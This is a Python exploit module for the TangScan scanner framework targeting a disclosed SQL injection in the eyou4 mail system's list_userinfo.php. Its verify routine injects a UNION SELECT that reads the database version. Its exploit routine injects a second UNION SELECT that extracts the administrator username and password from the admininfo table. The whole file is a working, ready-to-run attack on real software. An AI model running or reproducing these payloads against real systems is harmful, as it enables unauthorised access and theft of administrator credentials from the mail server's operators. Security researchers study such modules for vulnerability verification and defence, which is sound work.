#! /usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2013-2014 TangScan developers (http://www.wooyun.org/)
See the file 'docs/COPYING' for copying permission
author: fate0 <fate0@wooyun.org>
"""

import re

from thirdparty import requests
from modules.exploit import TSExploit


__all__ = ['TangScan']


class TangScan(TSExploit):
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "eyou4 list_userinfo.php sql 注入漏洞",
            "product": "eyou",
            "product_version": "4",
            "desc": """
                eyou4 邮件系统中 /php/bill/list_userinfo.php 中的 cp 参数存在注入, 将导致敏感数据泄漏
            """,
            "license": self.license.TS,
            "author": ["wooyun"],
            "ref": [
                {self.ref.wooyun: "http://www.wooyun.org/bugs/wooyun-2014-058014"},
            ],
            "type": self.type.injection,
            "severity": self.severity.high,
            "privileged": False,
            "disclosure_date": "2014-07-23",
            "create_date": "2014-09-23",
        }

        self.register_option({
            "url": {
                "default": "",
                "required": True,
                "choices": [],
                "convert": self.convert.url_field,
                "desc": "目标 url"
            }
        })

        self.register_result({
            "status": False,
            "data": {
                "user_info": {
                    "username": "",
                    "password": ""
                },
                "db_info": {
                    "version": "",
                }
            },
            "description": "",
            "error": ""
        })

    def verify(self):
        self.print_debug("verify start")

        re_version_pattern = re.compile(r'~~~(.+?)~~~', re.IGNORECASE | re.DOTALL | re.MULTILINE)
        cookies = {'cookie': 'admin'}
        exp_url = ("{domain}/php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1 union "
                   "select concat(0x7e7e7e,@@version,0x7e7e7e),2,3,4,5%23".format(domain=self.option.url))

        try:
            response = requests.get(exp_url, cookies=cookies, timeout=15, verify=False)
        except Exception, e:
            self.result.error = str(e)
            return

        re_result = re_version_pattern.findall(response.content)
        if len(re_result) == 0:
            self.result.status = False
            return

        self.result.status = True
        self.result.data.db_info.version = re_result[0]
        self.result.description = "目标 {url} 存在sql注入, 目标使用数据库版本为: {db_version}".format(
            url=self.option.url,
            db_version=re_result[0]
        )

    def exploit(self):
        self.print_debug("exploit start")

        re_userinfo_pattern = re.compile(r'~~~(\w+?)\|\|\|(\w+?)~~~', re.IGNORECASE | re.DOTALL | re.MULTILINE)
        cookies = {'cookie': 'admin'}
        exp_url = ("{domain}/php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1 union select concat(0x7e7e7e,"
                   "oid,0x7c7c7c,password,0x7e7e7e),2,3,4,5 from admininfo%23".format(domain=self.option.url))

        try:
            response = requests.get(exp_url, cookies=cookies, timeout=15, verify=False)
        except Exception, e:
            self.result.error = str(e)
            return

        re_result = re_userinfo_pattern.findall(response.content)
        if len(re_result) == 0:
            self.result.status = False
            return

        self.result.status = True
        self.result.data.user_info.username = re_result[0][0]
        self.result.data.user_info.password = re_result[0][1]
        self.result.description = "目标 {url} 存在sql注入, 目标管理员用户: {username}, 密码: {password}".format(
            url=self.option.url,
            username=self.result.data.user_info.username,
            password=self.result.data.user_info.password
        )


if __name__ == '__main__':
    from modules.main import main
    main(TangScan())
